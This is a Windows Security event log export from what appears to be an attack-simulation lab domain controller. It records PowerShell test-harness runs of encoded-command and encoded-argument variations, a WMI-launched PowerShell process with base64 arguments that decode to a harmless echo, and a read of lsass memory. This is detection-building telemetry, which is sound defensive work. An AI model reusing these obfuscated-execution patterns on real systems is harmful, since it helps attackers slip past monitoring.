ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382600
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x140c
	Process Name:	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
	Exit Status:	0x0
03/01/2021 10:55:48 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382599
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x10ec
	Process Name:	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
	Exit Status:	0x0
03/01/2021 10:55:48 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382598
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x10ec
	New Process Name:	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x140c
	Creator Process Name:	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
	Process Command Line:	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\2\RESB0B.tmp" "c:\Users\Administrator\AppData\Local\Temp\2\arfddg5p\CSCF60D2C72CB24E5CA37C5EAFB23BE71.TMP"

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:55:48 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382597
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x140c
	New Process Name:	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0xc34
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\2\arfddg5p\arfddg5p.cmdline"

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:55:48 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382596
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x1aec
	Process Name:	C:\Windows\System32\conhost.exe
	Exit Status:	0x0
03/01/2021 10:55:48 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382595
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0xc1c
	Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Exit Status:	0x0
03/01/2021 10:55:48 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382594
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xc34
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1698
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" & {Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -EncodedCommandParamVariation E -Execute -ErrorAction Stop} 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:55:48 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382593
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x1f74
	Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Exit Status:	0x0
03/01/2021 10:55:48 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4674
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Sensitive Privilege Use
OpCode=Info
RecordNumber=1382592
Keywords=Audit Success
Message=An operation was attempted on a privileged object.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Object:
	Object Server:	Security
	Object Type:	Section
	Object Name:	\Sessions\2\BaseNamedObjects\SessionImmersiveColorPreference
	Object Handle:	0x198

Process Information:
	Process ID:	0x1aec
	Process Name:	C:\Windows\System32\conhost.exe

Requested Operation:
	Desired Access:	DELETE
				READ_CONTROL
				WRITE_DAC
				WRITE_OWNER
				Query section state
				Map section for write
				Map section for read
				Map section for execute
				Extend size
				
	Privileges:		SeTakeOwnershipPrivilege
03/01/2021 10:55:48 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4674
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Sensitive Privilege Use
OpCode=Info
RecordNumber=1382591
Keywords=Audit Success
Message=An operation was attempted on a privileged object.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Object:
	Object Server:	Security
	Object Type:	-
	Object Name:	-
	Object Handle:	0x194

Process Information:
	Process ID:	0x1aec
	Process Name:	C:\Windows\System32\conhost.exe

Requested Operation:
	Desired Access:	2031617
	Privileges:		SeTakeOwnershipPrivilege
03/01/2021 10:55:48 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4674
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Sensitive Privilege Use
OpCode=Info
RecordNumber=1382590
Keywords=Audit Success
Message=An operation was attempted on a privileged object.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Object:
	Object Server:	Security
	Object Type:	Mutant
	Object Name:	\Sessions\2\BaseNamedObjects\SessionImmersiveColorMutex
	Object Handle:	0x194

Process Information:
	Process ID:	0x1aec
	Process Name:	C:\Windows\System32\conhost.exe

Requested Operation:
	Desired Access:	DELETE
				READ_CONTROL
				WRITE_DAC
				WRITE_OWNER
				SYNCHRONIZE
				Query mutant state
				
	Privileges:		SeTakeOwnershipPrivilege
03/01/2021 10:55:48 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4663
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Kernel Object
OpCode=Info
RecordNumber=1382589
Keywords=Audit Success
Message=An attempt was made to access an object.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Object:
	Object Server:		Security
	Object Type:		Process
	Object Name:		\Device\HarddiskVolume1\Windows\System32\lsass.exe
	Handle ID:		0x264
	Resource Attributes:	-

Process Information:
	Process ID:		0x1ad4
	Process Name:		C:\Windows\System32\wbem\WmiPrvSE.exe

Access Request Information:
	Accesses:		Read from process memory
				
	Access Mask:		0x10
03/01/2021 10:55:48 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382588
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		60125
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:48 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4674
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Sensitive Privilege Use
OpCode=Info
RecordNumber=1382587
Keywords=Audit Success
Message=An operation was attempted on a privileged object.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Object:
	Object Server:	Security
	Object Type:	File
	Object Name:	\Device\ConDrv
	Object Handle:	0x4

Process Information:
	Process ID:	0x1aec
	Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

Requested Operation:
	Desired Access:	DELETE
				READ_CONTROL
				WRITE_DAC
				WRITE_OWNER
				SYNCHRONIZE
				ReadData (or ListDirectory)
				WriteData (or AddFile)
				AppendData (or AddSubdirectory or CreatePipeInstance)
				ReadEA
				WriteEA
				Execute/Traverse
				DeleteChild
				ReadAttributes
				WriteAttributes
				
	Privileges:		SeTakeOwnershipPrivilege
03/01/2021 10:55:48 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382586
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1aec
	New Process Name:	C:\Windows\System32\conhost.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0xc1c
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:55:49 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4674
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Sensitive Privilege Use
OpCode=Info
RecordNumber=1382619
Keywords=Audit Success
Message=An operation was attempted on a privileged object.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Object:
	Object Server:	Security
	Object Type:	File
	Object Name:	\Device\ConDrv
	Object Handle:	0x4

Process Information:
	Process ID:	0x1e9c
	Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

Requested Operation:
	Desired Access:	DELETE
				READ_CONTROL
				WRITE_DAC
				WRITE_OWNER
				SYNCHRONIZE
				ReadData (or ListDirectory)
				WriteData (or AddFile)
				AppendData (or AddSubdirectory or CreatePipeInstance)
				ReadEA
				WriteEA
				Execute/Traverse
				DeleteChild
				ReadAttributes
				WriteAttributes
				
	Privileges:		SeTakeOwnershipPrivilege
03/01/2021 10:55:49 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382618
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1e9c
	New Process Name:	C:\Windows\System32\conhost.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x22ec
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:55:49 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382617
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		NT AUTHORITY\NETWORK SERVICE
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E4

Target Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	New Process ID:		0x22ec
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1ad4
	Creator Process Name:	C:\Windows\System32\wbem\WmiPrvSE.exe
	Process Command Line:	powershell.exe -NoProfile -EncodedArguments PABPAGIAagBzACAAVgBlAHIAcwBpAG8AbgA9ACIAMQAuADEALgAwAC4AMQAiACAAeABtAGwAbgBzAD0AIgBoAHQAdABwADoALwAvAHMAYwBoAGUAbQBhAHMALgBtAGkAYwByAG8AcwBvAGYAdAAuAGMAbwBtAC8AcABvAHcAZQByAHMAaABlAGwAbAAvADIAMAAwADQALwAwADQAIgA+AA0ACgAgACAAPABPAGIAagAgAFIAZQBmAEkAZAA9ACIAMAAiAD4ADQAKACAAIAAgACAAPABUAE4AIABSAGUAZgBJAGQAPQAiADAAIgA+AA0ACgAgACAAIAAgACAAIAA8AFQAPgBTAHkAcwB0AGUAbQAuAEMAbwBsAGwAZQBjAHQAaQBvAG4AcwAuAEEAcgByAGEAeQBMAGkAcwB0ADwALwBUAD4ADQAKACAAIAAgACAAIAAgADwAVAA+AFMAeQBzAHQAZQBtAC4ATwBiAGoAZQBjAHQAPAAvAFQAPgANAAoAIAAgACAAIAA8AC8AVABOAD4ADQAKACAAIAAgACAAPABMAFMAVAA+AA0ACgAgACAAIAAgACAAIAA8AFMAPgAzADAANABhADYAMQBmADIALQBkAGEAMABjAC0ANAA4ADcANQAtADgAMwAwADMALQA4ADgAYwA2ADEANwA0ADYANQAzADEAZAA8AC8AUwA+AA0ACgAgACAAIAAgADwALwBMAFMAVAA+AA0ACgAgACAAPAAvAE8AYgBqAD4ADQAKADwALwBPAGIAagBzAD4A -E VwByAGkAdABlAC0ASABvAHMAdAAgACQAYQByAGcAcwBbADAAXQA=

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:55:49 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382616
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x232c
	Process Name:	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
	Exit Status:	0x0
03/01/2021 10:55:49 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382615
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x217c
	Process Name:	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
	Exit Status:	0x0
03/01/2021 10:55:49 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382614
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x217c
	New Process Name:	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x232c
	Creator Process Name:	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
	Process Command Line:	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\2\RESEA5.tmp" "c:\Users\Administrator\AppData\Local\Temp\2\cz5i0d5t\CSCF70D6421C7C4452682E1F3C889B29C6B.TMP"

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:55:49 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382613
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x232c
	New Process Name:	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x20b8
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\2\cz5i0d5t\cz5i0d5t.cmdline"

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:55:49 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382612
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x1a6c
	Process Name:	C:\Windows\System32\conhost.exe
	Exit Status:	0x0
03/01/2021 10:55:49 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382611
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x2174
	Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Exit Status:	0x0
03/01/2021 10:55:49 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382610
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x20b8
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1698
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" & {Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -EncodedCommandParamVariation E -UseEncodedArguments -EncodedArgumentsParamVariation EncodedArguments -Execute -ErrorAction Stop} 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:55:49 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382609
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		61054
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:49 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382608
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0xc34
	Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Exit Status:	0x0
03/01/2021 10:55:49 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4674
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Sensitive Privilege Use
OpCode=Info
RecordNumber=1382607
Keywords=Audit Success
Message=An operation was attempted on a privileged object.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Object:
	Object Server:	Security
	Object Type:	Section
	Object Name:	\Sessions\2\BaseNamedObjects\SessionImmersiveColorPreference
	Object Handle:	0x190

Process Information:
	Process ID:	0x1a6c
	Process Name:	C:\Windows\System32\conhost.exe

Requested Operation:
	Desired Access:	DELETE
				READ_CONTROL
				WRITE_DAC
				WRITE_OWNER
				Query section state
				Map section for write
				Map section for read
				Map section for execute
				Extend size
				
	Privileges:		SeTakeOwnershipPrivilege
03/01/2021 10:55:49 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4674
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Sensitive Privilege Use
OpCode=Info
RecordNumber=1382606
Keywords=Audit Success
Message=An operation was attempted on a privileged object.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Object:
	Object Server:	Security
	Object Type:	-
	Object Name:	-
	Object Handle:	0x18c

Process Information:
	Process ID:	0x1a6c
	Process Name:	C:\Windows\System32\conhost.exe

Requested Operation:
	Desired Access:	2031617
	Privileges:		SeTakeOwnershipPrivilege
03/01/2021 10:55:49 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4674
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
